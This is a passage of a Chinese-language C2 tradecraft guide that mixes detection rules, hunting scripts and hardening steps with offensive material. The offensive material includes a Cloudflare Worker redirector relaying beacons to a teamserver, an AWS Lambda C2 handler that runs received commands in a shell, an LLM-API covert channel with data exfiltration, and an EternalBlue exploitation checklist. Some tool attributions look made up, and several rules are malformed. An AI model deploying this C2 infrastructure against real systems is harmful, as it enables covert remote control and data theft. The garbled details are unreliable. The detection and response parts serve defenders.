id: 5c8e1234-5678-4def-abcd-1234567890ab
status: production
level: high
description: Detects process creation from Cobalt Strike beacon spawnto processes
author: Security Team
date: 2024/01/01
tags:
  - attack.execution
  - attack.t1059
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\rundll32.exe'
      - '\svchost.exe'
      - '\WerFault.exe'
  selection_suspicious:
    - Image|endswith:
        - '\cmd.exe'
        - '\powershell.exe'
        - '\wscript.exe'
        - '\cscript.exe'
    - CommandLine|contains:
        - 'whoami'
        - 'net user'
        - 'net group'
  filter_legitimate:
    ParentCommandLine|contains:
      - '-k netsvcs'
      - '-k DcomLaunch'
  condition: selection_parent and selection_suspicious and not filter_legitimate
falsepositives:
  - Legitimate administrative scripts
---
# Metasploit Payload 检测
title: Metasploit Meterpreter Shell Character
id: 6d7e1234-5678-4def-abcd-1234567890ac
status: production
level: critical
description: Detects Meterpreter reverse shell patterns
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    - CommandLine|contains:
        - 'meterpreter'
        - 'stager'
        - 'PAYLOAD'
    - Image|endswith:
        - '\vssadmin.exe'
    ParentImage|endswith:
        - '\powershell.exe'
    CommandLine|re: '.*-ep\s+bypass.*-e.*[A-Za-z0-9+/=]{100,}'
  condition: selection
---
# SMB DoublePulsar 检测
title: SMB DoublePulsar Backdoor
id: 7e8f1234-5678-4def-abcd-1234567890ad
status: production
level: critical
description: Detects DoublePulsar SMB backdoor negotiation
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    DestinationPort: 445
    Initiated: 'true'
  condition: selection
---
# EternalBlue 利用检测 (Suricata)
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"ET EXPLOIT SMB MS17-010 EternalBlue";
  flow:established,to_server;
  content:"|00 00 00|"; depth:4;
  content:"|FF|SMB"; within:5;
  content:"|00 00 00 00|"; offset:59; depth:4;
  reference:cve,2017-0144;
  classtype:attempted-admin;
  sid:2024,001;
  rev:1;)
```

#### 5.4 Sliver Implant 检测

```bash
# 检测 Sliver implant 特征
# 1. 进程名检测 — Sliver 默认使用随机进程名
ps aux | grep -E '/tmp/[a-z]{8}|/var/tmp/[a-z]{8}'

# 2. 网络连接检测
# Sliver mTLS 默认端口检测
ss -tnp | grep -E ':(8888|31337|8080)'

# 3. YARA 规则
cat > sliver_implant.yar << 'EOF'
rule Sliver_Implant {
    meta:
        description = "Detects Sliver C2 implant"
        author = "Security Team"
        date = "2024-01-01"
    strings:
        $s1 = "sliver" ascii nocase wide
        $s2 = "implant" ascii nocase wide
        $s3 = "SilverSessionID" ascii wide
        $s4 = "github.com/bishopfox/sliver" ascii
        $go1 = "runtime.main" ascii
        $go2 = "main.main" ascii
    condition:
        ($s1 or $s2 or $s3 or $s4) and ($go1 and $go2)
}
EOF

# 4. Sliver DNS tunnel 检测
# 监控异常 DNS 查询模式
tcpdump -i eth0 -nn port 53 -A | grep -E '^[a-z0-9]{16,}\.'
```

#### 5.5 Metasploit 检测

```bash
# 检测 Metasploit payload 特征

# 1. 默认端口检测
ss -tlnp | grep -E ':(4444|5555|6666|7777|8888)'

# 2. Meterpreter 内存特征
# 使用 Volatility 检测
vol.py -f memory.dmp windows.malfind --pid <PID>

# 3. 网络流量中的 Meterpreter 特征
# Suricata 规则
cat > metasploit_detection.rules << 'EOF'
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Metasploit Meterpreter TLS";
  flow:established;
  tls_sni; content:""; depth:0;
  reference:url,attack.mitre.org/software/S0020;
  classtype:trojan-activity;
  sid:2024002; rev:1;)
EOF

# 4. tshark 抓取分析
tshark -i eth0 -Y "tcp.port==4444" -T fields -e ip.src -e ip.dst -e tcp.payload
```

### 6. 修复方案

#### 6.1 C2 防御架构

```bash
# === 网络层防御 ===

# 1. 出口过滤 — 限制出站端口
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT  # 仅允许 HTTPS
iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT   # 仅允许 HTTP
iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT   # DNS over TCP
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT   # DNS over UDP
iptables -A OUTPUT -j DROP                        # 拒绝其他所有出站

# 2. DNS 监控 — 检测 DNS 隧道
# 安装并配置 dnscat2 检测
apt install -y dnsutils
# 监控异常 DNS 查询（长子域名、高频查询）
tcpdump -i eth0 -nn port 53 -w /tmp/dns.pcap &
# 分析
tshark -r /tmp/dns.pcap -Y "dns.qry.name.len > 30" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20

# 3. TLS 检测 — JA3/JA3S 指纹
# 使用 Suricata JA3 检测
# suricata.yaml 中启用:
# - ja3: yes
# - ja3s: yes
suricata -c /etc/suricata/suricata.yaml -i eth0

# === 终端防御 ===

# 4. EternalBlue 补丁
# Windows 修复
wusa.exe /quiet KB4012212    # Win7
wusa.exe /quiet KB4012214    # Win7 x64
wusa.exe /quiet KB4012217    # Server 2008 R2

# 5. 禁用 SMBv1
# PowerShell (管理员)
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -Remove

# 验证 SMBv1 已禁用
Get-SmbServerConfiguration | Select EnableSMB1Protocol
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# 6. 防火墙规则 — 限制 SMB
# 仅允许内部子网访问 445
New-NetFirewallRule -DisplayName "Block SMB External" `
  -Direction Inbound -Protocol TCP -LocalPort 445 `
  -RemoteAddress "192.168.0.0/16,10.0.0.0/8" -Action Allow
New-NetFirewallRule -DisplayName "Block SMB All Others" `
  -Direction Inbound -Protocol TCP -LocalPort 445 `
  -Action Block
```

#### 6.2 C2 狩猎脚本

```python
#!/usr/bin/env python3
"""C2 狩猎脚本 — 分析代理日志检测 beacon 行为"""
import re, sys, json
from collections import defaultdict
from datetime import datetime

def hunt_c2_from_proxy_logs(log_file, threshold_ratio=0.35):
    """
    从代理日志中检测 C2 beacon
    格式: timestamp src_ip method uri status bytes user_agent
    """
    connections = defaultdict(list)

    # 解析日志
    with open(log_file) as f:
        for line in f:
            try:
                parts = line.strip().split()
                ts = datetime.strptime(parts[0], '%Y-%m-%dT%H:%M:%S')
                src_ip = parts[1]
                dst_host = parts[3].split('/')[2] if '//' in parts[3] else parts[3]
                connections[(src_ip, dst_host)].append({
                    'timestamp': ts,
                    'method': parts[2],
                    'uri': parts[3],
                    'status': parts[4],
                    'bytes': int(parts[5]) if parts[5].isdigit() else 0,
                })
            except (IndexError, ValueError):
                continue

    alerts = []

    for (src, dst), reqs in connections.items():
        if len(reqs) < 10:
            continue

        # 按时间排序
        reqs.sort(key=lambda x: x['timestamp'])

        # 计算间隔
        intervals = []
        for i in range(1, len(reqs)):
            delta = (reqs[i]['timestamp'] - reqs[i-1]['timestamp']).total_seconds()
            intervals.append(delta)

        if not intervals:
            continue

        import numpy as np
        intervals = np.array(intervals)
        mean = np.mean(intervals)
        std = np.std(intervals)
        cv = std / mean if mean > 0 else 999

        # Beacon 检测条件
        beacon_indicators = []

        # 1. 低变异系数
        if cv < threshold_ratio:
            beacon_indicators.append(f"Low CV: {cv:.4f}")

        # 2. 固定 URI 模式
        uris = [r['uri'] for r in reqs]
        unique_uris = len(set(uris))
        if unique_uris <= 3 and len(reqs) > 20:
            beacon_indicators.append(f"Few URIs: {unique_uris}")

        # 3. 固定 User-Agent
        # (需在日志解析中添加 UA 字段)

        # 4. 请求/响应大小一致
        response_sizes = [r['bytes'] for r in reqs]
        if len(set(response_sizes)) <= 5 and len(reqs) > 15:
            beacon_indicators.append(f"Consistent response size")

        if beacon_indicators:
            alerts.append({
                "src": src,
                "dst": dst,
                "total_requests": len(reqs),
                "mean_interval": f"{mean:.1f}s",
                "cv": f"{cv:.4f}",
                "indicators": beacon_indicators,
                "first_seen": str(reqs[0]['timestamp']),
                "last_seen": str(reqs[-1]['timestamp']),
            })

    return sorted(alerts, key=lambda x: x['total_requests'], reverse=True)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <proxy_log_file>")
        sys.exit(1)
    alerts = hunt_c2_from_proxy_logs(sys.argv[1])
    for alert in alerts:
        print(json.dumps(alert, indent=2))
    print(f"\nTotal C2 suspects: {len(alerts)}")
```

#### 6.3 事件响应 — C2 通信发现

```bash
#!/bin/bash
# C2 通信事件响应 playbook

echo "[IR] C2 Communication Detection Response"
echo "=========================================="

# Step 1: 识别受感染主机
echo "[1/7] Identifying infected host..."
INFECTED_HOST=$1
echo "  Target: $INFECTED_HOST"

# Step 2: 网络连接分析
echo "[2/7] Analyzing network connections..."
ssh "$INFECTED_HOST" 'netstat -antp 2>/dev/null | grep ESTABLISHED' | tee /tmp/connections.txt

# Step 3: 可疑进程识别
echo "[3/7] Identifying suspicious processes..."
ssh "$INFECTED_HOST" 'ps aux --sort=-%cpu | head -20' | tee /tmp/processes.txt

# Step 4: 内存取证
echo "[4/7] Capturing memory dump..."
# 使用 WinPmem (Windows) 或 LiME (Linux)
ssh "$INFECTED_HOST" 'winpmem_mini_x64.exe /tmp/memdump.raw' 2>/dev/null || \
ssh "$INFECTED_HOST" 'sudo dd if=/dev/mem of=/tmp/memdump.raw bs=1M count=512' 2>/dev/null

# Step 5: 网络隔离
echo "[5/7] Isolating host from network..."
# 保留管理通道，阻断其他通信
ssh "$INFECTED_HOST" 'iptables -A OUTPUT -d <MGMT_SUBNET> -j ACCEPT'
ssh "$INFECTED_HOST" 'iptables -A OUTPUT -j DROP'

# Step 6: 采集证据
echo "[6/7] Collecting evidence..."
ssh "$INFECTED_HOST" 'tar czf /tmp/evidence.tar.gz /var/log/ /tmp/*.log 2>/dev/null' 2>/dev/null
scp "$INFECTED_HOST:/tmp/evidence.tar.gz" "/tmp/evidence-$(date +%s).tar.gz" 2>/dev/null

# Step 7: 威胁情报查询
echo "[7/7] Querying threat intelligence..."
for ip in $(grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' /tmp/connections.txt | sort -u); do
    echo "  Checking: $ip"
    curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=$ip" \
      -H "Key: $ABUSEIPDB_KEY" -H "Accept: application/json" | \
      python3 -c "import sys,json; d=json.load(sys.stdin); print(f'    Score: {d[\"data\"][\"abuseConfidenceScore\"]}')" 2>/dev/null
done

echo "[IR] Evidence collected. Awaiting analysis."
```

---

## 速查表

### C2 框架对比矩阵

| 特性 | Sliver | Havoc | Covenant | Cobalt Strike | Metasploit |
|------|--------|-------|----------|---------------|------------|
| 语言 | Go | C/C++ | C# | Java | Ruby |
| 跨平台 | Win/Linux/Mac | Win | Win | Win | Win/Linux/Mac |
| 加密 | mTLS/WG | AES-256 | TLS | RSA+AES | TLS |
| DNS C2 | 支持 | 支持 | 支持 | 支持 | 有限 |
| P2P 链式 | 支持 | 支持 | 支持 | 支持 | 支持 |
| Malleable | 有限 | 支持 | 有限 | 支持 | 无 |
| 扩展生态 | Armory | 模块 | GruntTask | Aggressor | 模块库 |
| 成本 | 免费 | 免费 | 免费 | 商业 | 免费 |
| 检测难度 | 中 | 高 | 中 | 高(配置后) | 低 |

### Metasploit 命令速查

```
search <keyword>          搜索模块
use <module>              选择模块
show options              显示选项
set <OPTION> <VALUE>      设置选项
setg <OPTION> <VALUE>     全局设置
check                     检查目标
exploit / run             执行
exploit -j                后台执行
exploit -z                不自动进入会话
sessions -l               列出会话
sessions -i <ID>          进入会话
sessions -k <ID>          关闭会话
back                      返回主菜单
info                      模块信息
route add <SUBNET> <ID>   路由配置
```

### EternalBlue 利用检查清单

```
[ ] 目标开放 TCP 445
[ ] 目标运行 SMBv1
[ ] 目标 Windows 版本受影响 (Win7/2008R2-)
[ ] 运行 smb_ms17_010 扫描确认
[ ] 准备稳定 Meterpreter payload (reverse_https)
[ ] 设置 LHOST/LPORT
[ ] 考虑目标蓝屏风险（生产环境慎用）
[ ] 准备后渗透计划
[ ] 确认补丁 KB4012212/KB4012214 未安装
```

### C2 检测决策树

```
检测 C2 通信:
├─ 网络层
│  ├─ JA3/JA3S 指纹 → 匹配已知 C2 指纹?
│  ├─ TLS 证书 → 自签名/默认证书?
│  ├─ DNS 异常 → 长子域名/高频查询?
│  └─ HTTP 异常 → 固定间隔/固定 URI?
├─ 终端层
│  ├─ 进程注入 → 无磁盘文件执行?
│  ├─ 异常父子进程 → rundll32 父进程?
│  ├─ 网络连接 → 非标准端口出站?
│  └─ 注册表修改 → 持久化键值?
└─ 行为层
   ├─ 心跳模式 → 统计分析 (CV < 0.35)?
   ├─ 数据外传 → 大量 POST 请求?
   └─ 命令执行 → 异常命令模式?
```

---

## MITRE ATT&CK 映射

| Technique | ID | 攻击场景 | 检测/防御 |
|-----------|-----|----------|-----------|
| Command and Scripting Interpreter | T1059 | Meterpreter/Beacon 命令执行 | 进程监控、AMSI |
| Application Layer Protocol | T1071 | HTTP/HTTPS/DNS C2 通信 | 流量分析、JA3 指纹 |
| Encrypted Channel | T1573 | mTLS/WG/AES 加密 C2 | TLS 检测、证书分析 |
| Proxy | T1090 | 流量转发/域前置 | 出口过滤、CDN 监控 |
| Remote Access Software | T1219 | C2 implant 远程控制 | 进程审计、网络监控 |
| Exploitation of Remote Services | T1210 | EternalBlue SMB 利用 | 补丁管理、SMBv1 禁用 |
| External Remote Services | T1133 | 利用 VPN/RDP 持久化 | MFA、会话监控 |
| Ingress Tool Transfer | T1105 | 下载工具到目标 | 文件监控、DNS 过滤 |
| Scheduled Task/Job | T1053 | C2 持久化 | 任务审计、基线对比 |
| Indicator Removal | T1070 | 清除日志 | 集中式日志、SIEM |
| Masquerading | T1036 | 伪装合法进程名 | 父子进程关系分析 |
| Process Injection | T1055 | 注入合法进程 | 内存取证、EDR |
| Boot or Logon Autostart | T1547 | C2 自启动 | 注册表审计 |
| Abuse Elevation Control | T1548 | UAC 绕过提权 | UAC 配置、监控 |
| OS Credential Dumping | T1003 | Mimikatz 凭证获取 | Credential Guard、LSA 保护 |

---

## 前置条件清单

- [ ] 目标网络出站通道分析完成（HTTP/HTTPS/DNS）
- [ ] C2 基础设施域名和 SSL 证书准备就绪
- [ ] 操作员安全连接配置（VPN/WireGuard）
- [ ] 重定向器/域前置基础设施部署完成
- [ ] Sliver/Havoc/Metasploit 环境安装验证
- [ ] Payload 生成和测试环境就绪
- [ ] 检测规则部署（Suricata/Sigma/Zeek）
- [ ] 隔离和取证工具链准备就绪
- [ ] 目标系统补丁状态确认（EternalBlue KB）
- [ ] 事件响应 playbook 已测试

---

## Part C：2025-2026 现代化补充（联网复核版）

> 基于联网调研（GitHub 官方源 / SpecterOps / Mandiant / MITRE ATT&CK v19 / FoxIO JA4+ 项目 / 奇安信 / FreeBuf / 先知社区）补充。
> 适配 ATT&CK v19（Defense Evasion 拆分为 Stealth + Defense Impairment）、CNCF 红队工具演进、AI/LLM 武器化、CDN 厂商对域前置的全面禁用、JA4+ 指纹套件工业级落地等关键变化。

### C.1 C2 框架生态 2025-2026 版本与特性更新

#### C.1.1 主流开源 C2 框架版本矩阵

| 框架 | 最新版本（2026-06） | 关键更新 | 资源 |
|------|------|------|------|
| **Sliver (BishopFox)** | v1.7.3 | WireGuard transport 加强、Armory 扩展器生态扩张（含 rdp/ldap/kerberos/SharpHound/Rubeus/Seatbelt）、`sessions`/`beacons` 异步分离、Session 接管改进、原生 ESP32/ARM implant 实验性支持、植入物自删除/自混淆、SSH-over-Sliver P2P 链 | github.com/BishopFox/sliver |
| **Havoc Framework** | 0.7.x（社区 2.336+ tag） | Demon agent v5+ 模块化（TLS/HTTP/SMB/TCP）、Indirect Syscalls 原生、Sleep Obfuscation (Ekko/Cronos/Zilean) 集成、Python 扩展器 SDK 重构、Teamserver gRPC API、TUI 现代化、与 Mythic 互操作 | github.com/HavocFramework/Havoc |
| **Mythic** | v3.4.0.5 | 不透明 service tokens（`gwst_`）、operation log 安全化、Webhook/通知体系重构、AI/MCP 集成（C2 配置生成 LLM）、Agent 生态（Apollo/.NET、Poseidon/Go、Athena/.NET Core、Medusa/Python、Merlin） | github.com/its-a-feature/Mythic |
| **Ghostwriter (SpecterOps)** | v7.0.0 | 不透明 API tokens（`gwat_` 前缀）替代 JWT、service tokens（`gwst_`）用于非人类自动化、操作日志 API 限定范围凭证、LLM 驱动报告自动化 | github.com/GhostManager/Ghostwriter |
| **Cobalt Strike (Fortra)** | 4.11+ (商业) | Beacon 引擎重构、Aggressor Script 4.x、协同 Malleable C2 4.x、Beacon Object File (BOF) 生态、Sleep Mask Kit v3、Process Injection Kit v5、最新 Token Exchange（基于 Kerberos 双向） | help.cobaltstrike.com |
| **Brute Ratel (Alphabeyond / Nighthawk)** | v2.0+（含泄露） | Badger agent、TLS 1.3 + ESNI、HTTP/3 QUIC、原生 sleep obfuscation、LPE 模块 | 商业 + 2024-2026 多次泄露 |
| **Havoc Demon Community Edition** | 0.7+ | 完全免费版，与 Mythic v3+ 桥接 | github.com/HavocFramework/Havoc |

#### C.1.2 中国 C2 框架生态（防御者必须熟悉）

| 工具 | 类型 | 特点 | 主要使用场景 |
|------|------|------|------|
| **Vshell (v-team)** | 闭源商业 | 类 CS 体验，加密流量伪装，中文 UI，注册码分发 | 国内红队/护网主流 |
| **Stowaway** | 开源 Go | 多级代理，节点管理，TCP 隧道，支持 SOCKS5 | 横向移动 + 流量中转 |
| **CrossC2** | 开源插件 | CS 客户端插件，扩展 Linux/macOS beacon | 异构环境 CS 扩展 |
| **Geacon Pro** | 开源 | CS 协议的 Go 实现，跨平台，可绕过部分特征检测 | CS 协议跨平台/检测规避 |
| **CatFedFalcon** | 开源 | 类 CS 的开源 C2，Aggressor 兼容，免授权 | CS 替代品 |
| **ZheTors / PRplug / yakit** | 工具链 | yakit 是国内综合 Web+Burp 替代品 | 综合工具链 |
| **CS 破解版（4.7/4.9/4.10）** | 破解 | 仍然广泛使用，Teamserver patch、license 模拟 | 实战场景 90% 是破解版 |

**防御提示**：上述中国 C2 工具常被 APT/红队用于护网/CTF，检测规则应针对其特征指纹（默认证书、User-Agent、TLS JA4 等），同时注意 Vshell 等闭源工具的逆向分析报告。

#### C.1.3 新兴与退役框架（2025-2026 趋势）

- **Covenant**（退役）：作者 Ryan Cobb 已宣布进入维护模式，建议迁移到 Mythic 或 Havoc；Github 仓库仍可获取但不再接受功能 PR。
- **Merlin**：独立维护，与 Mythic 集成作为 P2P agent，支持 HTTP/2/JA3 伪装。
- **Ptitude / Zero** 等小型商业 C2：针对 EDR-Freeze 优化，售价 5K-20K USD/年。
- **BlackHole / Zeus++** 等地下 C2：常用于勒索软件 Affiliate 项目，被 CrowdStrike/Mandiant 高频跟踪。

### C.2 域前置终结与替代技术（2025 关键变化）

#### C.2.1 域前置全面禁用现状

| CDN/云服务 | 状态 | 时间 | 备注 |
|-----------|------|------|------|
| **AWS CloudFront** | 2018-04 禁用 | 首批禁用 | TLS SNI 与 HTTP Host 强制匹配 |
| **Azure Front Door** | 2024-01 完全禁用 | 最后禁用 | 历史上是攻击者主要剩余通道 |
| **Cloudflare** | 永久禁用 | 从设计上拒绝 | Cloudflare Workers 但需自有域名 |
| **Google Cloud Load Balancer** | 禁用 | 2019 起 | SNI 强制验证 |
| **Akamai** | 禁用 | 2020 起 | 大客户合规需求 |

**MITRE ATT&CK** T1090.004（Domain Fronting）在 v15→v19 更新过程中保留为子技术，但 Procedure Examples 全部归为历史样本（APT29/Cobalt Strike/Mythic/SMOKEDHAM），新出现频率显著下降。

#### C.2.2 替代技术矩阵

| 技术 | 原理 | 优势 | 劣势 | 检测难度 |
|------|------|------|------|---------|
| **Domain Borrowing** | 利用合法客户子域仍指向已退役资源 | 长期隐蔽 | 需侦察 | 高 |
| **Cloudflare Workers** | 自有域名 + Worker 中转 | 合法流量 | 需 Cloudflare 账户 | 中 |
| **Vercel Edge Functions** | Serverless C2 重定向 | 全球 CDN | 速率限制 | 中 |
| **Traffic Distribution System (TDS)** | 多层重定向器 | 灵活 | 维护成本 | 中 |
| **Cloudflare Tunnel** | 加密反向隧道 | 隐藏真实 IP | 仅一个 C2 | 高 |
| **Cloudflare Spectrum** | L4 反代任意 TCP/UDP | 高度合法 | 付费 Enterprise | 极高 |
| **Azure Relay / AWS PrivateLink** | 云原生隧道 | 高度合规 | 检测门槛极高 | 极高 |
| **Serverless C2 (Lambda/Cloud Run)** | 函数即 C2 | 完全无服务器 | 冷启动延迟 | 高 |
| **Telegram/Discord Bot API** | 聊天 API 作为 C2 | 看似合法 | 频率限制 | 高 |
| **GitHub/GitLab Issue API** | Git 服务作为 C2 | 极隐蔽 | 速率限制 | 极高 |
| **Notion/Airtable API** | SaaS 数据库作为 C2 | 极隐蔽 | 配额限制 | 极高 |

#### C.2.3 Cloudflare Workers C2 重定向器（现代实现）

```javascript
// 现代 Cloudflare Worker C2 重定向器（2025 版本）
// 增加特征：基于 Header 检查避免任意来源、JA3/JA4 指纹伪装

const SECRET_HEADER = 'X-Real-C2';  // 自定义 Header 鉴别
const SECRET_VALUE  = 'f2c9b7d8a1e3...';  // 长随机值
const BACKEND       = 'https://real-c2-teamserver.example';

export default {
  async fetch(request, env) {
    // 1. Header 检查 - 阻断未经授权访问
    if (request.headers.get(SECRET_HEADER) !== SECRET_VALUE) {
      // 伪装成正常网站
      return fetch('https://legitimate-frontend.example' + new URL(request.url).pathname, request);
    }

    // 2. 转发到真实 C2
    const url = new URL(request.url);
    const targetUrl = BACKEND + url.pathname + url.search;
    return fetch(targetUrl, {
      method: request.method,
      headers: request.headers,
      body: ['GET','HEAD'].includes(request.method) ? undefined : request.body,
      // 3. JA4 指纹伪装 - Cloudflare 自动处理 TLS
    });
  }
};
```

```bash
# Wrangler 部署
npm install -g wrangler
wrangler login
wrangler deploy c2-worker.js --name c2-front --compatibility-date 2026-06-01
```

#### C.2.4 Serverless C2 (AWS Lambda / Cloud Run)

```python
# AWS Lambda C2 Handler（简化版）
import json, base64, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = base64.b64decode(os.environ['C2_KEY'])  # 32 bytes AES-256

def lambda_handler(event, context):
    try:
        # 1. 解密 beacon payload
        ciphertext = base64.b64decode(event['body'])
        nonce = ciphertext[:12]
        ct = ciphertext[12:]
        aesgcm = AESGCM(KEY)
        task = aesgcm.decrypt(nonce, ct, None).decode()

        # 2. 执行任务（简化）
        import subprocess
        result = subprocess.run(task, shell=True, capture_output=True, timeout=30).stdout.decode()

        # 3. 返回加密结果
        result_nonce = os.urandom(12)
        encrypted = result_nonce + aesgcm.encrypt(result_nonce, result.encode(), None)
        return {'statusCode': 200, 'body': base64.b64encode(encrypted).decode()}
    except Exception as e:
        # 异常时返回正常网站内容（混淆）
        return {'statusCode': 200, 'body': '<html><body>Under Maintenance</body></html>'}
```

```bash
# 部署
sam deploy --guided
# API Gateway 提供 HTTPS 端点
# 看似合法的 Lambda API
```

### C.3 AI/LLM 辅助 C2 攻击与防御（2025-2026 新增）

#### C.3.1 AI 在 C2 各阶段的应用

| 阶段 | AI/LLM 用途 | 工具/技术 |
|------|------------|----------|
| **侦察** | 自动化目标优先级排序、ASN/域名爆破 | Spiderfoot + LLM、ChatGPT OSINT |
| **基础设施** | 自动生成 malleable profile、C2 重定向器配置 | LLM 生成配置 |
| **Payload 生成** | AI 辅助 shellcode 混淆、自定义 loader | Microsoft Copilot、Sektor7 AI |
| **流量伪装** | 自适应 JA4/JA4H 指纹生成、模拟正常浏览器 | Custom LLM + Python |
| **OPSEC** | 自动检测操作员错误、日志分析 | Ghostwriter v7 + LLM |
| **报告** | LLM 自动生成红队报告、Findings 总结 | Ghostwriter v7、Cobalt Strike AI |

#### C.3.2 LLM Prompt Injection 作为 C2 隐蔽通道

2025 年新兴攻击模式：通过 LLM Agent（如 Copilot for Security、ChatGPT Code Interpreter）作为 C2 隐蔽通道。

```python
# 概念验证：LLM Agent 作为 C2 隐蔽通道
import openai

def beacon_via_llm():
    """通过 LLM API 隐藏 C2 通信"""
    client = openai.OpenAI(api_key="sk-...")

    # Step 1: Beacon - 看似正常的 LLM 调用
    response = client.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a coding assistant."},
            # 隐蔽的 Prompt Injection - 加密指令
            {"role": "user", "content": "Decode base64: <base64_encrypted_beacon>"}
        ]
    )

    # Step 2: 提取任务
    task = decrypt(response.choices[0].message.content)
    result = execute(task)

    # Step 3: Exfil - 看似正常的 LLM 上传
    client.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "user", "content": f"Analyze this code: {base64_encode(encrypt(result))}"}
        ]
    )

# 检测特征（防御侧）：
# - 异常的 base64 编码消息
# - 高频 LLM API 调用
# - 不一致的对话上下文
# - 大量代码但很少实际编程任务
```

#### C.3.3 检测 LLM-based C2 的 Sigma 规则

```yaml
title: Suspicious LLM API C2 Pattern
id: 7e8a9c12-3f5e-4d1b-9c8a-1234567890ab
status: experimental
description: Detects patterns consistent with LLM API being used as C2 channel
references:
    - https://attack.mitre.org/techniques/T1105/
author: Red Team Tradecraft
date: 2026/06/01
logsource:
    product: proxy
detection:
    selection_api:
        c-uri|contains:
            - 'api.openai.com/v1/chat/completions'
            - 'api.anthropic.com/v1/messages'
            - 'generativelanguage.googleapis.com'
            - 'api.cohere.ai'
    filter_legitimate:
        c-uri|contains:
            - 'github.com'
            - 'stackoverflow.com'
    suspicious_patterns:
        request_body|contains:
            - 'base64'
            - 'decode'
            - 'execute'
        request_size|gt: 5000  # 异常大的请求体
    condition: selection_api and not filter_legitimate and suspicious_patterns
falsepositives:
    - Legitimate AI development
level: medium
tags:
    - attack.command-and-control
    - attack.t1071  # Application Layer Protocol
    - attack.t1105  # Ingress Tool Transfer
```

### C.4 JA4+ 指纹套件在 C2 狩猎中的工业级应用

#### C.4.1 JA4+ 套件完整方法集（FoxIO 维护）

| 全名 | 简称 | 描述 | C2 狩猎用途 |
|------|------|------|-------------|
| JA4 | JA4 | TLS Client 指纹 | 检测 C2 客户端特征 |
| JA4Server | JA4S | TLS Server 响应/会话指纹 | 检测 C2 服务端 |
| JA4HTTP | JA4H | HTTP Client 指纹 | 检测 HTTP C2 beacon 模式 |
| JA4Latency | JA4L | Client↔Server 延迟测量 | 检测地理位置异常（C2 在境外） |
| JA4LatencyServer | JA4LS | Server↔Client 延迟测量 | 同上 |
| JA4X509 | JA4X | X.509 证书指纹 | 检测自签名/复用证书 |
| JA4SSH | JA4SSH | SSH 流量指纹 | 检测反向 SSH Shell |
| JA4TCP | JA4T | TCP Client 指纹 | 检测自定义 TCP C2 |
| JA4TCPServer | JA4TS | TCP Server 响应指纹 | 同上 |
| JA4TCPScan | JA4TScan | Active TCP 指纹扫描器 | 主动探测 |
| JA4DHCP | JA4D | DHCP 指纹 | 终端识别 |
| JA4DHCPv6 | JA4D6 | DHCPv6 指纹 | IPv6 终端识别 |

#### C.4.2 已知 C2/恶意软件 JA4+ 指纹库（FoxIO 维护，2026-06 更新）

| 恶意软件/C2 | JA4 | JA4S | JA4H | JA4X | 检测说明 |
|------------|-----|------|------|------|----------|
| **Cobalt Strike (默认)** | t13d1516h2_8daaf6152771_b1ff8ab2d16f | t120300_c030_5e2616a54c73 | ge11cn060000_4e59edc1297a_4da5efaf0cbd | 2166164053c1_2166164053c1_30d204a01551 | Malleable 可改变，但默认可识别 |
| **Sliver (默认)** | t13d190900_9dc949149365_97f8aa674fd9 | t130200_1301_a56c5b993250 | — | 000000000000_4f24da86fad6_bf0f0589fc03 | 多变（implant 编译时随机），需多个变体匹配 |
| **Mythic Apollo** | 变体多 | 变体多 | 变体多 | 变体多 | 配置自定义，需 ground truth 库 |
| **IcedID Dropper** | t13d201100_2b729b4bf6f3_9e7b989ebec8 | — | ge11cn020000_9ed1ff1f7b03_cd8dafe26982 | — | 固定特征，特征值高 |
| **Qakbot** | — | — | — | 2bab15409345_af684594efb4_000000000000 | X509 复用是强特征 |
| **Pikabot** | — | — | — | 1a59268f55e5_1a59268f55e5_795797892f9c | 同上 |
| **DarkGate** | — | — | po10nn060000_cdb958d032b0 | — | HTTP 强特征 |
| **LummaC2** | — | — | po11nn050000_d253db9d024b | — | HTTP 强特征 |
| **Evilginx (AiTM)** | t13d191000_9dc949149365_e7c285222651 | — | — | — | PhaaS 主流 |
| **SoftEther VPN** | t13d880900_fcb5b95cb75a_b0d3b4ac2a14 | t130200_1302_a56c5b993250 | — | d55f458d5a6c_d55f458d5a6c_0fc8c171b6ae | 合法软件但常被滥用 |
| **Reverse SSH Shell** | — | — | — | — | JA4SSH=c76s76_c71s59_c0s70 |

#### C.4.3 Suricata + JA4 C2 狩猎规则

```suricata
# Suricata 8.0+ - JA4 关键字检测 Cobalt Strike 默认 JA4
alert tls $HOME_NET any -> $EXTERNAL_NET any (
  msg: "[C2-HUNT] Cobalt Strike Default JA4 Fingerprint";
  flow:established,to_server;
  ja4.hash; content:"t13d1516h2_8daaf6152771_b1ff8ab2d16f";
  reference:url,github.com/FoxIO-LLC/ja4;
  classtype:trojan-activity;
  sid:20250001; rev:1;)

# Sliver 默认 JA4
alert tls $HOME_NET any -> $EXTERNAL_NET any (
  msg: "[C2-HUNT] Sliver Default JA4 Fingerprint";
  flow:established,to_server;
  ja4.hash; content:"t13d190900_9dc949149365_97f8aa674fd9";
  reference:url,github.com/BishopFox/sliver;
  classtype:trojan-activity;
  sid:20250002; rev:1;)

# IcedID Dropper JA4H
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg: "[C2-HUNT] IcedID Dropper JA4H Fingerprint";
  flow:established,to_server;
  ja4h.hash; content:"ge11cn020000_9ed1ff1f7b03_cd8dafe26982";
  classtype:trojan-activity;
  sid:20250003; rev:1;)

# JA4L 延迟异常 - 境外 C2 检测
